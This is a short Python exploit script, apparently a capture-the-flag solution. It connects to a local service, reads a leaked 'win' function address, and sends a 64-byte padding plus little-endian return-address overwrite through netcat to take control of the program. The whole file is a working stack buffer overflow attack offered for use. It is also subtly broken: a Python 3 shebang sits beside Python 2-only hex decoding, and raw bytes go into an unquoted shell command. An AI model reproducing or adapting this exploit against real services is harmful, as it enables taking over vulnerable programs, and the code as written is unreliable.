#!/usr/bin/python3

from socket import *
import re
import os

host = "127.0.0.1"
port = 5001
address = (host, port)

s = socket(AF_INET, SOCK_STREAM)
s.connect(address)
reply = s.recv(4096)
reply = reply[:-1]

winAddr = re.search('0x(.{7,8})', reply.decode('ascii')).group(0)
if winAddr:
	print("Win address found: %s" % (winAddr))
else:
	print("Winning address not found, exiting...")
	exit(0)

winAddr = winAddr[2:]
if len(winAddr) < 8:
	winAddr = "0" + winAddr
print("Correcting if needed: %s" % (winAddr))
payload = "a"*64 + winAddr[-2:].decode("hex") + winAddr[-4:-2].decode("hex") + winAddr[-6:-4].decode("hex") + winAddr[-8:-6].decode("hex") 
print("Sending payload: %s" % (payload))
s.close()

os.system("(echo %s; cat) | nc %s %d" % (payload, host, port))
